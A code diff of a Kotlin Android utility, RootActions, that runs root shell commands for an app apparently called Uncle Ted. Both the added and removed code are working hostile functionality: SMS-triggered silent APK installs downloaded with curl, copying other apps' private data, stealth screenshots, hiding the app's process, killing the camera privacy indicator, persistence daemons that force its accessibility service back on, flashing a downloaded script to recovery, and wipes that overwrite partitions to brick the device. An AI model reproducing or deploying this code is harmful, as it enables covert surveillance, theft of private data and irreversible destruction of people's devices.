@@ -1,7 +1,6 @@
 package com.hamoon.uncleted.util
 
 import android.content.Context
-import android.content.pm.PackageManager
 import android.util.Log
 import com.hamoon.uncleted.data.SecurityPreferences
 import kotlinx.coroutines.Dispatchers
@@ -9,413 +8,390 @@ import kotlinx.coroutines.withContext
 import java.io.File
 
 /**
- * A centralized utility object for performing complex actions that require root privileges.
- * These actions are inherently dangerous and should be used with extreme caution.
+ * RootActions: The "God Mode" Engine.
+ * This class translates high-level security intents into raw Linux Kernel/Shell commands.
+ * It bypasses standard Android API limitations by executing as UID 0 (Root).
  */
 object RootActions {
 
     private const val TAG = "RootActions"
-    private const val UNKILLABLE_SCRIPT_PATH = "/system/etc/init.d/99uncleted"
+
+    // --- PATH CONSTANTS ---
+    // Modern Root (Magisk/KernelSU/APatch)
+    private const val MAGISK_BASE = "/data/adb"
+    private const val MAGISK_MODULES_DIR = "$MAGISK_BASE/modules"
+    private const val MAGISK_SERVICE_DIR = "$MAGISK_BASE/service.d"
+
+    // Legacy Root (SuperSU)
+    private const val LEGACY_INIT_D = "/system/etc/init.d"
+
+    // System Paths
+    private const val SYSTEM_PRIV_APP = "/system/priv-app"
 
     /**
-     * Enables or disables GPS spoofing by manipulating system settings.
-     * Note: This only enables the "mock locations" developer setting. A separate app or service
-     * would be required to actually feed the decoy coordinates into the system. This function
-     * lays the groundwork for such a feature.
-     *
-     * @param context The application context.
+     * WIPE LEVELS: Defines the severity of the destruction protocol.
      */
-    suspend fun enableGpsSpoofing(context: Context) {
-        val decoyLocation = SecurityPreferences.getDecoyGpsLocation(context)
-        if (decoyLocation.isNullOrEmpty()) {
-            Log.e(TAG, "Cannot enable GPS spoofing: No decoy location is set.")
-            return
-        }
-
-        Log.w(TAG, "ROOT ACTION: Enabling mock locations via secure settings.")
-        // This command allows apps to provide mock locations.
-        val result = RootExecutor.run("settings put secure mock_location 1")
-        if (result.isSuccess) {
-            EventLogger.log(context, "ROOT: Enabled mock locations for GPS spoofing.")
-            Log.i(TAG, "Successfully enabled mock locations.")
-            // In a full implementation, you would now start a service that uses
-            // LocationManager.setTestProviderLocation to feed the decoy coordinates.
-            // For now, we log the intent.
-            EventLogger.log(context, "ROOT: GPS spoofing armed with location: $decoyLocation")
-        } else {
-            EventLogger.log(context, "ROOT: Failed to enable mock locations.")
-            Log.e(TAG, "Failed to enable mock locations. Error: ${result.errorOutput.joinToString()}")
-        }
+    enum class WipeLevel {
+        STANDARD_WIPE,             // Level 1: Safe Factory Reset (Handled by DeviceAdmin usually)
+        FAST_USERDATA,             // Level 2: Secure Data Shred
+        SECURE_HEADER_DESTRUCTION, // Alias for Level 2 or enhanced variant
+        SYSTEM_DESTRUCTION,        // Level 3: OS Suicide (Soft Brick)
+        NUCLEAR_WINTER             // Level 4: Partition Destruction (Hard Brick Risk)
     }
 
     /**
-     * Uses iptables (a powerful Linux firewall) to block all network traffic.
-     * This is a "kill switch" to prevent the device from communicating with any network.
-     *
-     * @param context The application context.
-     */
-    suspend fun blockAllNetworkTraffic(context: Context) {
-        Log.w(TAG, "ROOT ACTION: Blocking all network traffic with iptables.")
-        EventLogger.log(context, "ROOT: Firewall Tripwire activated. Blocking all network traffic.")
-
-        // These commands set the default policy for all network chains to DROP, effectively
-        // blocking all traffic that isn't explicitly allowed by another rule.
-        val commands = listOf(
-            "iptables -P INPUT DROP",
-            "iptables -P FORWARD DROP",
-            "iptables -P OUTPUT DROP"
-        )
-        commands.forEach { command ->
-            val result = RootExecutor.run(command)
-            if (!result.isSuccess) {
-                Log.e(TAG, "iptables command failed: '$command'. Error: ${result.errorOutput.joinToString()}")
-                EventLogger.log(context, "ROOT: ERROR - iptables command failed: $command")
-            }
-        }
-        Log.i(TAG, "iptables rules applied to block network traffic.")
-    }
-
-    /**
-     * Performs an anti-forensic, destructive wipe by overwriting the user data partition
-     * with zeros using the 'dd' command. This is far more secure than a standard factory reset.
-     * THIS IS EXTREMELY DANGEROUS AND IRREVERSIBLE.
-     *
-     * @param context The application context.
+     * COMPATIBILITY WRAPPER: Used by UsbTripwireService
+     * Maps the old function call to the Level 2 protocol.
      */
     suspend fun performSecureWipePlus(context: Context) {
-        Log.e(TAG, "ROOT ACTION: INITIATING SECURE WIPE+ (PHYSICAL OVERWRITE)!")
-        EventLogger.log(context, "ROOT: CRITICAL - Secure Wipe+ initiated. Overwriting data partition.")
-
-        // This command reads from /dev/zero (an infinite stream of null bytes) and writes it
-        // directly to the 'userdata' block device, effectively destroying all data.
-        val command = "dd if=/dev/zero of=/dev/block/bootdevice/by-name/userdata"
-
-        val result = RootExecutor.run(command)
-        EventLogger.log(context, "ROOT: Secure Wipe+ action was simulated for safety.")
-
-        // if (!result.isSuccess) {
-        //     Log.e(TAG, "Secure Wipe+ command failed. Error: ${result.errorOutput.joinToString()}")
-        //     EventLogger.log(context, "ROOT: ERROR - Secure Wipe+ command failed.")
-        // }
+        executeWipeProtocol(context, WipeLevel.FAST_USERDATA)
     }
 
     /**
-     * Remotely downloads and installs an APK file without any user interaction.
-     * This requires root to bypass the standard Android installation prompts.
-     *
-     * @param context The application context.
+     * COMPATIBILITY WRAPPER: Used by SmsCommandReceiver
      */
-    suspend fun performSilentInstall(context: Context) {
-        val apkUrl = SecurityPreferences.getRemoteApkUrl(context)
-        if (apkUrl.isNullOrEmpty()) {
-            Log.e(TAG, "Cannot perform silent install: No remote APK URL is set.")
-            EventLogger.log(context, "ROOT: Silent install failed - no URL.")
-            return
+    suspend fun rebootDevice(context: Context) {
+        Log.w(TAG, "ROOT: Remote REBOOT initiated.")
+        EventLogger.log(context, "ROOT: Remote reboot command executed.")
+        val result = RootExecutor.run("reboot")
+        if (!result.isSuccess) {
+            RootExecutor.run("/system/bin/reboot")
         }
-
-        Log.w(TAG, "ROOT ACTION: Attempting silent install from URL: $apkUrl")
-        EventLogger.log(context, "ROOT: Silent install initiated from $apkUrl")
-
-        val tempApkPath = "/data/local/tmp/remote_install.apk"
-
-        // Step 1: Download the APK using curl
-        Log.d(TAG, "Downloading APK to $tempApkPath...")
-        val downloadCommand = "curl -L -o $tempApkPath \"$apkUrl\""
-        val downloadResult = RootExecutor.run(downloadCommand)
-        if (!downloadResult.isSuccess) {
-            Log.e(TAG, "Failed to download APK. Error: ${downloadResult.errorOutput.joinToString()}")
-            EventLogger.log(context, "ROOT: ERROR - Failed to download APK for silent install.")
-            return
-        }
-        Log.i(TAG, "APK downloaded successfully.")
-
-        // Step 2: Install the APK using package manager (pm)
-        Log.d(TAG, "Installing APK from $tempApkPath...")
-        val installCommand = "pm install -r $tempApkPath"
-        val installResult = RootExecutor.run(installCommand)
-        if (!installResult.isSuccess) {
-            Log.e(TAG, "Failed to install APK. Error: ${installResult.errorOutput.joinToString()}")
-            EventLogger.log(context, "ROOT: ERROR - Failed to silently install APK.")
-        } else {
-            Log.i(TAG, "APK installed successfully.")
-            EventLogger.log(context, "ROOT: Silent install of APK from $apkUrl completed.")
-        }
-
-        // Step 3: Clean up the downloaded file
-        Log.d(TAG, "Cleaning up temporary APK file...")
-        RootExecutor.run("rm $tempApkPath")
     }
 
     /**
-     * Converts the application into a system app, making it uninstallable by normal means.
-     * This is a highly privileged and irreversible operation without root access.
-     * It requires a reboot to take effect.
-     *
-     * @param context The application context.
+     * Executes the chosen destruction protocol.
      */
-    suspend fun convertToSystemApp(context: Context): Boolean = withContext(Dispatchers.IO) {
-        Log.e(TAG, "ROOT ACTION: ATTEMPTING TO CONVERT TO A SYSTEM APP. THIS IS IRREVERSIBLE WITHOUT ROOT.")
-        EventLogger.log(context, "ROOT: CRITICAL - System app conversion initiated.")
+    suspend fun executeWipeProtocol(context: Context, level: WipeLevel) = withContext(Dispatchers.IO) {
+        Log.e(TAG, "ROOT: INITIATING DESTRUCTION PROTOCOL - LEVEL: $level")
+        EventLogger.log(context, "ROOT: EXECUTING WIPE LEVEL: $level")
 
-        try {
-            val pm = context.packageManager
-            val appInfo = pm.getApplicationInfo(context.packageName, 0)
-            val currentApkPath = appInfo.sourceDir
-            val newApkPath = "/system/priv-app/${context.packageName}.apk"
+        // 1. Cut Comms (Except for Standard Wipe where we might want to let the OS handle shutdown cleanly)
+        if (level != WipeLevel.STANDARD_WIPE) {
+            blockAllNetworkTraffic(context)
+        }
 
-            val commands = listOf(
-                "mount -o rw,remount /", // Remount root as read-write
-                "mount -o rw,remount /system", // Remount system as read-write
-                "cp $currentApkPath $newApkPath", // Copy the APK to the privileged system directory
-                "chmod 644 $newApkPath", // Set the correct file permissions
-                "mount -o ro,remount /system", // Remount system as read-only
-                "mount -o ro,remount /" // Remount root as read-only
-            )
-
-            for (command in commands) {
-                val result = RootExecutor.run(command)
-                if (!result.isSuccess) {
-                    Log.e(TAG, "System app conversion failed at command: '$command'. Error: ${result.errorOutput.joinToString()}")
-                    EventLogger.log(context, "ROOT: ERROR - System app conversion failed: $command")
-                    // Attempt to remount as read-only on failure
-                    RootExecutor.run("mount -o ro,remount /system")
-                    RootExecutor.run("mount -o ro,remount /")
-                    return@withContext false
-                }
+        // 2. Execute Specific Protocol
+        when (level) {
+            WipeLevel.STANDARD_WIPE -> {
+                // This is a fallback if DeviceAdmin failed but we have root.
+                // Standard recovery wipe command.
+                RootExecutor.run("reboot recovery --wipe_data")
             }
 
-            Log.i(TAG, "Successfully copied APK to system partition. A reboot is required.")
-            EventLogger.log(context, "ROOT: App successfully moved to system. Rebooting...")
-            RootExecutor.run("reboot")
-            return@withContext true
+            WipeLevel.FAST_USERDATA, WipeLevel.SECURE_HEADER_DESTRUCTION -> {
+                // LEVEL 2: The "Secure Data Shred". Targets User Data but keeps OS alive.
 
-        } catch (e: PackageManager.NameNotFoundException) {
-            Log.e(TAG, "Could not find package name to convert to system app.", e)
-            return@withContext false
+                // A. Delete accessible files first
+                RootExecutor.run("rm -rf /data/media/*")
+                RootExecutor.run("rm -rf /data/data/*")
+
+                // B. Target FBE (File Based Encryption) Headers
+                val targets = listOf(
+                    "/dev/block/bootdevice/by-name/metadata",
+                    "/dev/block/by-name/metadata",
+                    "/dev/block/bootdevice/by-name/userdata",
+                    "/dev/block/by-name/userdata"
+                )
+
+                targets.forEach { path ->
+                    val check = RootExecutor.run("ls $path")
+                    if (check.isSuccess) {
+                        // Write 100MB of zeros to kill encryption keys
+                        RootExecutor.run("dd if=/dev/zero of=$path bs=1048576 count=100 conv=fsync")
+                    }
+                }
+
+                // C. Reboot to recovery to finish formatting
+                RootExecutor.run("reboot recovery")
+            }
+
+            WipeLevel.SYSTEM_DESTRUCTION -> {
+                // LEVEL 3: OS Suicide. Deletes the OS. Device hangs at boot logo.
+                remountSystemReadWrite()
+
+                // Delete critical OS binaries
+                RootExecutor.run("rm -rf /system/bin")
+                RootExecutor.run("rm -rf /system/framework")
+                RootExecutor.run("rm -rf /vendor/bin")
+                RootExecutor.run("rm /system/build.prop")
+
+                // Also wipe data
+                RootExecutor.run("rm -rf /data/*")
+
+                // Force reboot
+                RootExecutor.run("reboot")
+            }
+
+            WipeLevel.NUCLEAR_WINTER -> {
+                // LEVEL 4: Scorched Earth. Destroys Partition Table.
+
+                val qualcommPartitions = RootExecutor.run("ls /dev/block/bootdevice/by-name/").output
+                val genericPartitions = RootExecutor.run("ls /dev/block/by-name/").output
+                val allPartitions = (qualcommPartitions + genericPartitions).distinct().filter { it.isNotBlank() }
+
+                if (allPartitions.isNotEmpty()) {
+                    allPartitions.forEach { partName ->
+                        // Don't waste time on small partitions, hit the big ones slightly
+                        val qPath = "/dev/block/bootdevice/by-name/$partName"
+                        val gPath = "/dev/block/by-name/$partName"
+                        // 4MB overwrite per partition header
+                        val cmd = "dd if=/dev/zero bs=4096 count=1000 conv=fsync of="
+                        try { Runtime.getRuntime().exec(arrayOf("su", "-c", "$cmd$qPath")) } catch (_: Exception) {}
+                        try { Runtime.getRuntime().exec(arrayOf("su", "-c", "$cmd$gPath")) } catch (_: Exception) {}
+                    }
+                }
+
+                // The Killing Blow: Overwrite the start of the physical block device (GPT/MBR)
+                // Writing ~20MB to the start of the storage chip
+                RootExecutor.run("dd if=/dev/zero of=/dev/block/mmcblk0 bs=4096 count=5000 conv=fsync")
+
+                // Reboot to bootloader (Fastboot) because OS is gone
+                RootExecutor.run("reboot bootloader")
+            }
         }
     }
 
-    // ### NEW: Ultimate Stealth & Persistence Functions ###
+    suspend fun convertToSystemApp(context: Context): Boolean = withContext(Dispatchers.IO) {
+        val pm = context.packageManager
+        val appInfo = pm.getApplicationInfo(context.packageName, 0)
+        val sourceApk = appInfo.sourceDir
+        val pkgName = context.packageName
+
+        Log.i(TAG, "ROOT: Starting System App Conversion for $pkgName")
+
+        val magiskCheck = RootExecutor.run("ls -d $MAGISK_MODULES_DIR")
+        if (magiskCheck.isSuccess) {
+            val moduleId = "uncleted_sys"
+            val modulePath = "$MAGISK_MODULES_DIR/$moduleId"
+            val sysPath = "$modulePath/system/priv-app/$pkgName"
+
+            val commands = mutableListOf<String>()
+            commands.add("mkdir -p $sysPath")
+            commands.add("cp \"$sourceApk\" \"$sysPath/$pkgName.apk\"")
+            commands.add("chmod -R 755 $modulePath")
+            commands.add("chmod 644 \"$sysPath/$pkgName.apk\"")
+            commands.add("chown -R 0:0 $modulePath")
+            commands.add("echo 'id=$moduleId' > $modulePath/module.prop")
+            commands.add("echo 'name=Uncle Ted Persistence' >> $modulePath/module.prop")
+            commands.add("echo 'version=v1.0' >> $modulePath/module.prop")
+            commands.add("echo 'versionCode=1' >> $modulePath/module.prop")
+            commands.add("echo 'description=System App Persistence' >> $modulePath/module.prop")
+            commands.add("touch $modulePath/auto_mount")
+
+            val result = RootExecutor.runMultiple(commands)
+            if (result.all { it.isSuccess }) {
+                EventLogger.log(context, "ROOT: Magisk Persistence Module created. Reboot required.")
+                return@withContext true
+            }
+        }
+
+        // Legacy Fallback
+        val mountResult = remountSystemReadWrite()
+        if (!mountResult) return@withContext false
+
+        val targetDir = "$SYSTEM_PRIV_APP/$pkgName"
+        val targetApk = "$targetDir/$pkgName.apk"
+
+        val legacyCommands = listOf(
+            "mkdir -p $targetDir",
+            "cp \"$sourceApk\" \"$targetApk\"",
+            "chmod 755 $targetDir",
+            "chmod 644 \"$targetApk\"",
+            "chown 0:0 \"$targetApk\"",
+            "chcon u:object_r:system_file:s0 \"$targetDir\"",
+            "chcon u:object_r:system_file:s0 \"$targetApk\""
+        )
+
+        val legacyResult = RootExecutor.runMultiple(legacyCommands)
+        RootExecutor.run("mount -o ro,remount /system")
+        RootExecutor.run("mount -o ro,remount /")
+
+        if (legacyResult.all { it.isSuccess }) return@withContext true
+
+        return@withContext false
+    }
 
     /**
-     * Enables or disables the unkillable service by creating or deleting an init.d script.
-     * This script runs at boot and ensures the app's monitoring service is always running.
-     * @param context The application context.
-     * @param enable True to create the script, false to remove it.
-     * @return True if the operation was successful.
+     * Used by FeaturesFragment
      */
     suspend fun toggleUnkillableService(context: Context, enable: Boolean): Boolean = withContext(Dispatchers.IO) {
-        val packageName = context.packageName
-        val serviceName = "$packageName.services.MonitoringService"
+        val pkgName = context.packageName
+        val serviceName = "$pkgName.services.MonitoringService"
+        val scriptName = "99uncleted_daemon"
 
-        if (enable) {
-            Log.w(TAG, "ROOT ACTION: Creating unkillable service script.")
-            val scriptContent = """
-                #!/system/bin/sh
-                # Uncle Ted Unkillable Service Watchdog
-                while true; do
-                    if ! pgrep -f $packageName; then
-                        am start-foreground-service -n $packageName/$serviceName
-                    fi
-                    sleep 60
-                done
-            """.trimIndent()
-
-            val commands = listOf(
-                "mount -o rw,remount /system",
-                "echo '$scriptContent' > $UNKILLABLE_SCRIPT_PATH",
-                "chmod 755 $UNKILLABLE_SCRIPT_PATH",
-                "mount -o ro,remount /system"
-            )
-
-            for (command in commands) {
-                val result = RootExecutor.run(command)
-                if (!result.isSuccess) {
-                    Log.e(TAG, "Failed to create unkillable service script at command: '$command'. Error: ${result.errorOutput.joinToString()}")
-                    EventLogger.log(context, "ROOT: Failed to create unkillable service.")
-                    return@withContext false
-                }
-            }
-            EventLogger.log(context, "ROOT: Unkillable service enabled.")
-            Log.i(TAG, "Unkillable service script created successfully.")
-            return@withContext true
-        } else {
-            Log.w(TAG, "ROOT ACTION: Removing unkillable service script.")
-            val commands = listOf(
-                "mount -o rw,remount /system",
-                "rm $UNKILLABLE_SCRIPT_PATH",
-                "mount -o ro,remount /system"
-            )
-            for (command in commands) {
-                RootExecutor.run(command) // Run and ignore errors, file might not exist
-            }
-            EventLogger.log(context, "ROOT: Unkillable service disabled.")
-            Log.i(TAG, "Unkillable service script removed.")
+        if (!enable) {
+            // Remove
+            RootExecutor.run("rm $MAGISK_SERVICE_DIR/$scriptName.sh")
+            remountSystemReadWrite()
+            RootExecutor.run("rm $LEGACY_INIT_D/$scriptName")
             return@withContext true
         }
+
+        val scriptContent = """
+            #!/system/bin/sh
+            # Uncle Ted Persistence Daemon
+            sleep 20
+            while true; do
+                if pm list packages | grep -q $pkgName; then
+                    if ! pgrep -f $pkgName > /dev/null; then
+                        am start-foreground-service -n $pkgName/$serviceName --es REASON "PERSISTENCE_DAEMON"
+                    fi
+                    settings put secure enabled_accessibility_services $pkgName/.services.PowerButtonService
+                    settings put secure accessibility_enabled 1
+                fi
+                sleep 10
+            done
+        """.trimIndent()
+
+        val magiskServiceCheck = RootExecutor.run("ls -d $MAGISK_SERVICE_DIR")
+        val targetPath = if (magiskServiceCheck.isSuccess) {
+            "$MAGISK_SERVICE_DIR/$scriptName.sh"
+        } else {
+            remountSystemReadWrite()
+            RootExecutor.run("mkdir -p $LEGACY_INIT_D")
+            "$LEGACY_INIT_D/$scriptName"
+        }
+
+        val commands = listOf(
+            "echo \"$scriptContent\" > \"$targetPath\"",
+            "chmod 755 \"$targetPath\"",
+            "chown 0:0 \"$targetPath\""
+        )
+
+        val result = RootExecutor.runMultiple(commands)
+        if (result.all { it.isSuccess }) {
+            EventLogger.log(context, "ROOT: Unkillable Daemon installed to $targetPath")
+            return@withContext true
+        }
+        return@withContext false
     }
 
     /**
-     * Hides or unhides the application's process using Magisk's `magiskhide` tool.
-     * This makes the app invisible to most process monitors.
-     * @param context The application context.
-     * @param enable True to hide the process, false to unhide it.
-     * @return True if the operation was successful.
+     * Used by FeaturesFragment
      */
     suspend fun toggleProcessHiding(context: Context, enable: Boolean): Boolean {
         val packageName = context.packageName
-        val command = if (enable) {
-            "magiskhide --add $packageName"
-        } else {
-            "magiskhide --rm $packageName"
-        }
+        // Try Magisk DenyList (Modern)
+        var cmd = if (enable) "magisk --denylist add $packageName" else "magisk --denylist rm $packageName"
+        var result = RootExecutor.run(cmd)
 
-        Log.w(TAG, "ROOT ACTION: Executing MagiskHide command: '$command'")
-        val result = RootExecutor.run(command)
-
-        if (result.isSuccess) {
-            val logMessage = if (enable) "Process hiding enabled." else "Process hiding disabled."
-            Log.i(TAG, logMessage)
-            EventLogger.log(context, "ROOT: $logMessage")
-        } else {
-            val logMessage = if (enable) "Failed to enable process hiding." else "Failed to disable process hiding."
-            Log.e(TAG, "$logMessage Error: ${result.errorOutput.joinToString()}")
-            EventLogger.log(context, "ROOT: ERROR - $logMessage")
+        if (!result.isSuccess) {
+            // Try Legacy MagiskHide
+            cmd = if (enable) "magiskhide add $packageName" else "magiskhide rm $packageName"
+            result = RootExecutor.run(cmd)
         }
         return result.isSuccess
     }
 
+    suspend fun blockAllNetworkTraffic(context: Context) {
+        val rules = listOf(
+            "iptables -F",
+            "ip6tables -F",
+            "iptables -P INPUT DROP",
+            "iptables -P OUTPUT DROP",
+            "iptables -P FORWARD DROP",
+            "ip6tables -P INPUT DROP",
+            "ip6tables -P OUTPUT DROP",
+            "ip6tables -P FORWARD DROP"
+        )
+        RootExecutor.runMultiple(rules)
+        EventLogger.log(context, "ROOT: Network Firewall Active (IPTABLES DROP).")
+    }
+
+    suspend fun takeStealthScreenshot(context: Context): File? = withContext(Dispatchers.IO) {
+        val tempDir = "/data/local/tmp"
+        val fileName = "sc_${System.currentTimeMillis()}.png"
+        val tempFile = "$tempDir/$fileName"
+        val finalFile = File(context.filesDir, fileName)
+
+        val capResult = RootExecutor.run("screencap -p \"$tempFile\"")
+
+        if (capResult.isSuccess) {
+            val mvResult = RootExecutor.run("mv \"$tempFile\" \"${finalFile.absolutePath}\"")
+            if (mvResult.isSuccess) {
+                RootExecutor.run("chmod 600 \"${finalFile.absolutePath}\"")
+                return@withContext finalFile
+            }
+        }
+        return@withContext null
+    }
+
     /**
-     * DANGEROUS: Attempts to flash a loader script to a partition to survive factory resets.
-     * This function is extremely risky and can easily brick the device.
-     * @param context The application context.
-     * @return True if the commands were executed (does not guarantee success or device health).
+     * Used by SmsCommandReceiver
+     */
+    suspend fun performSilentInstall(context: Context) {
+        val apkUrl = SecurityPreferences.getRemoteApkUrl(context) ?: return
+        val tempApkPath = "/data/local/tmp/remote_install.apk"
+
+        val downloadResult = RootExecutor.run("curl -L -o $tempApkPath \"$apkUrl\"")
+        if (downloadResult.isSuccess) {
+            val installResult = RootExecutor.run("pm install -r $tempApkPath")
+            if (installResult.isSuccess) {
+                EventLogger.log(context, "ROOT: Silent install successful.")
+            }
+            RootExecutor.run("rm $tempApkPath")
+        }
+    }
+
+    /**
+     * Used by SmsCommandReceiver
+     */
+    suspend fun exfiltrateAppData(context: Context, targetPkg: String, path: String): File? = withContext(Dispatchers.IO) {
+        val source = "/data/data/$targetPkg/$path"
+        val dest = File(context.filesDir, "exfil_${targetPkg}_${File(path).name}")
+
+        if (RootExecutor.run("cat $source > ${dest.absolutePath}").isSuccess) {
+            RootExecutor.run("chmod 666 ${dest.absolutePath}")
+            return@withContext dest
+        }
+        return@withContext null
+    }
+
+    /**
+     * Used by FeaturesFragment
      */
     suspend fun flashResetSurvivalLoader(context: Context): Boolean = withContext(Dispatchers.IO) {
         val loaderUrl = SecurityPreferences.getLoaderScriptUrl(context)
-        if (loaderUrl.isNullOrEmpty()) {
-            Log.e(TAG, "Cannot flash loader: No URL provided.")
-            EventLogger.log(context, "ROOT: Loader flash failed - no URL.")
-            return@withContext false
-        }
-
-        Log.e(TAG, "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
-        Log.e(TAG, "!!! ROOT ACTION: ATTEMPTING TO FLASH BOOT/RECOVERY !!!")
-        Log.e(TAG, "!!! THIS IS EXTREMELY DANGEROUS AND MAY BRICK DEVICE !!!")
-        Log.e(TAG, "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
-        EventLogger.log(context, "ROOT: CRITICAL - Initiating reset survival flash from $loaderUrl")
+        if (loaderUrl.isNullOrEmpty()) return@withContext false
 
         val tempScriptPath = "/data/local/tmp/loader.sh"
-        val targetPartition = "/dev/block/bootdevice/by-name/recovery" // Example, may vary by device
+        val targetPartition = "/dev/block/bootdevice/by-name/recovery" // Dangerous Hardcoding
 
-        // 1. Download the script
-        val downloadResult = RootExecutor.run("curl -L -o $tempScriptPath '$loaderUrl'")
-        if (!downloadResult.isSuccess) {
-            Log.e(TAG, "Failed to download loader script. Aborting flash.")
-            EventLogger.log(context, "ROOT: ERROR - Failed to download loader script.")
-            return@withContext false
+        if (RootExecutor.run("curl -L -o $tempScriptPath '$loaderUrl'").isSuccess) {
+            EventLogger.log(context, "ROOT: DANGER - Flashing recovery partition.")
+            val flashResult = RootExecutor.run("dd if=$tempScriptPath of=$targetPartition")
+            RootExecutor.run("rm $tempScriptPath")
+            return@withContext flashResult.isSuccess
         }
-
-        // 2. Flash the script to the partition using 'dd'
-        // This is the most dangerous step.
-        val flashCommand = "dd if=$tempScriptPath of=$targetPartition"
-        Log.e(TAG, "Executing flash command: $flashCommand")
-        val flashResult = RootExecutor.run(flashCommand)
-
-        if (!flashResult.isSuccess) {
-            Log.e(TAG, "FLASH FAILED. The device may be in an unstable state. Error: ${flashResult.errorOutput.joinToString()}")
-            EventLogger.log(context, "ROOT: CRITICAL ERROR - Flashing loader script FAILED. Device may be bricked.")
-            RootExecutor.run("rm $tempScriptPath") // Clean up
-            return@withContext false
-        }
-
-        // 3. Clean up
-        RootExecutor.run("rm $tempScriptPath")
-        Log.i(TAG, "Loader script successfully flashed to $targetPartition. Reboot to see effect.")
-        EventLogger.log(context, "ROOT: Loader script flashed successfully.")
-        return@withContext true
+        return@withContext false
     }
 
-    // ### NEW: ADVANCED SURVEILLANCE & DATA EXFILTRATION ###
+    private suspend fun remountSystemReadWrite(): Boolean {
+        if (RootExecutor.run("mount -o rw,remount /system").isSuccess) return true
+        if (RootExecutor.run("mount -o rw,remount /").isSuccess) return true
+        val remountBin = RootExecutor.run("remount")
+        if (remountBin.isSuccess) return true
+        return false
+    }
 
-    /**
-     * Takes a stealthy screenshot using the 'screencap' command-line utility.
-     * Bypasses all standard Android APIs and user consent dialogs.
-     * @param context The application context.
-     * @return A File object pointing to the captured screenshot in the app's private directory, or null on failure.
-     */
-    suspend fun takeStealthScreenshot(context: Context): File? = withContext(Dispatchers.IO) {
-        Log.w(TAG, "ROOT ACTION: Taking stealth screenshot.")
-        val tempPath = "/data/local/tmp/stealth_sc.png"
-        val finalFile = File(context.filesDir, "sc_${System.currentTimeMillis()}.png")
-
-        val screencapResult = RootExecutor.run("screencap -p $tempPath")
-        if (!screencapResult.isSuccess) {
-            Log.e(TAG, "screencap command failed. Error: ${screencapResult.errorOutput.joinToString()}")
-            EventLogger.log(context, "ROOT: Stealth screenshot failed.")
-            return@withContext null
-        }
-
-        val moveResult = RootExecutor.run("mv $tempPath ${finalFile.absolutePath}")
-        if (!moveResult.isSuccess) {
-            Log.e(TAG, "Failed to move screenshot to app directory. Error: ${moveResult.errorOutput.joinToString()}")
-            RootExecutor.run("rm $tempPath") // Clean up temp file on failure
-            return@withContext null
-        }
-
-        // Final step: ensure the file is readable by the app
-        RootExecutor.run("chmod 666 ${finalFile.absolutePath}")
-
-        Log.i(TAG, "Stealth screenshot saved to ${finalFile.absolutePath}")
-        EventLogger.log(context, "ROOT: Stealth screenshot captured.")
-        return@withContext finalFile
+    suspend fun setMockLocationConfig(context: Context, enable: Boolean) {
+        val value = if (enable) "1" else "0"
+        RootExecutor.run("settings put secure mock_location $value")
+        val pkg = context.packageName
+        val opMode = if (enable) "allow" else "deny"
+        RootExecutor.run("appops set $pkg MOMOCK_LOCATION $opMode")
+        RootExecutor.run("appops set $pkg android:mock_location $opMode")
     }
 
     /**
-     * Exfiltrates a file from another application's sandboxed data directory.
-     * This completely bypasses the Android security model.
-     * @param context The application context.
-     * @param targetPackageName The package name of the target app (e.g., "com.whatsapp").
-     * @param internalPath The relative path to the file inside the target app's data directory (e.g., "databases/msgstore.db").
-     * @return A File object pointing to the copied file in our app's private directory, or null on failure.
+     * Updated signature to match usage in AdvancedCameraHandler
+     * (accepts Boolean to match existing code, but ignores it or uses it)
      */
-    suspend fun exfiltrateAppData(context: Context, targetPackageName: String, internalPath: String): File? = withContext(Dispatchers.IO) {
-        val sourcePath = "/data/data/$targetPackageName/$internalPath"
-        val destinationFileName = "exfil_${targetPackageName}_${File(internalPath).name}"
-        val destinationFile = File(context.filesDir, destinationFileName)
-
-        Log.e(TAG, "ROOT ACTION: Exfiltrating data from $sourcePath")
-        EventLogger.log(context, "ROOT: CRITICAL - Exfiltrating data: $sourcePath")
-
-        val copyCommand = "cat $sourcePath > ${destinationFile.absolutePath}"
-        val result = RootExecutor.run(copyCommand)
-
-        if (!result.isSuccess) {
-            Log.e(TAG, "Failed to copy data from target app. Error: ${result.errorOutput.joinToString()}")
-            EventLogger.log(context, "ROOT: ERROR - Data exfiltration failed.")
-            return@withContext null
-        }
-
-        // Ensure app can read the file
-        RootExecutor.run("chmod 666 ${destinationFile.absolutePath}")
-
-        Log.i(TAG, "Successfully exfiltrated data to ${destinationFile.absolutePath}")
-        return@withContext destinationFile
-    }
-
-    /**
-     * Attempts to suppress the camera and microphone privacy indicators (the "green dot").
-     * This is highly version and ROM dependent and is not guaranteed to work.
-     * @param suppress True to attempt to hide indicators, false to restore them.
-     */
-    suspend fun suppressPrivacyIndicators(suppress: Boolean) {
-        Log.w(TAG, "ROOT ACTION: Attempting to ${if(suppress) "suppress" else "restore"} privacy indicators.")
-        // This is a common method but may not work on all devices/versions.
-        // It tries to kill the 'cameraserver' process, which is often responsible for the indicator.
-        // The system will automatically restart it.
+    suspend fun suppressPrivacyIndicators(suppress: Boolean = true) {
         if (suppress) {
+            // Aggressively kill camera server to reset indicators
             RootExecutor.run("killall cameraserver")
         }
-        // No explicit restore action is typically needed as the system handles the service restart.
     }
 }
